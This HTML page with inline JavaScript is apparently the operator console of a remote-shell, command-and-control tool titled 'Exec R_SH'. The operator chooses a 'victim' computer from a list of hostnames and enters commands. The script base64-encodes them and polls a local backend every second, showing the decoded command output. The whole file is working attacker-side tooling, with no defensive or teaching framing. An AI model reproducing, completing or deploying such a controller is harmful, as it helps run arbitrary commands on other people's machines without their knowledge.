<!DOCTYPE html>
<html>
<style>
    .float-container {
    border: 3px solid #fff;
    padding: 20px;
    }

    .float-child {
    width: 50%;
    float: left;
    padding: 20px;
    border: 2px solid black;
    }  

    .center {
        border: 5px solid;
        text-align: center;
    }
</style>
<body>
    <h1>Exec R_SH</h1>
    <div id="rsh_area">
        <div id="selection_area" class="float-child">
            <label for="uuid">Select a target computer:</label>
            <select name="uuid" id="uuid">
            <option value="ravin-DESKTOP-GHQLPCR" selected>ravin-DESKTOP-GHQLPCR</option>
            <option value="ravin-DESKTOP-OAE00US" disabled>ravin-DESKTOP-OAE00US</option>
            <option value="Computer 2" disabled>Computer_2</option>
            <option value="Computer 3" disabled>Computer_3</option>
            <option value="Computer_4" disabled>Computer_4</option>
            </select> <br><br>
            <label for="exec_cmd_lbl">Enter Execute Command:</label>
            <input type="text" id="exec_cmd_txtbx"><br><br>
            <input type="submit" id="submit_presed">
        </div>
        <div id="output_area" class="float-child">
            <textarea id="rsh_output_box" name="w3review" rows="10" cols="50"></textarea>
        </div>
    </div>
</body>
<script>
    var server_address = "http://127.0.0.1:3001"
    var cmd_json = ""
    var cmd_data = ""
    
    var selected_victim = document.getElementById("selection_area")
    var output_box = document.getElementById("rsh_output_box")

    document.getElementById("submit_presed").addEventListener("click", function() {	
        console.log("Button Pressed")
        submit_presed();
    });

    function submit_presed() {
        var exec_cmd_textbox = document.getElementById("exec_cmd_txtbx")
        cmd_data = exec_cmd_textbox.value
        console.log(cmd_data)
    }

    function create_post_response_msg(data) {
        const getSelectedText = (el) => {
            if (el.selectedIndex === -1) return "null";
            return el.options[el.selectedIndex].text;
        }

        const select = document.querySelector('select')
        const text = getSelectedText(select);
        console.log("Create Post Response")
        var json_data = '{"user_id": "'+ text +'", "type": "internal_msg", '
		json_data += '"data": "' + window.btoa(data) +'"}'
		return json_data
    }
    
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    async function internal_message_service() {
        while (true) {
            console.log("Sending Interval Msg")
            // Sending post request to back end
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var output_text = JSON.parse(this.responseText)
                    var response_data = output_text["command_response_data"]
                    if (response_data != undefined) {
                        response_data = response_data.replaceAll('\"', '')
                        response_data = response_data.replaceAll('\n', '')
                        output_box.value += atob(response_data)
                    }
                }
            };

            xhr.open("POST", server_address, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.setRequestHeader('Access-Control-Allow-Headers', '*');
            xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
            xhr.setRequestHeader('Accept', '*/*');

            cmd_json = create_post_response_msg(cmd_data)
            console.log(cmd_json)
            xhr.send(cmd_json);
            
            cmd_json = ""
            cmd_data = ""
            await sleep(1000);
        }
    }

    internal_message_service()
		
</script>
</html>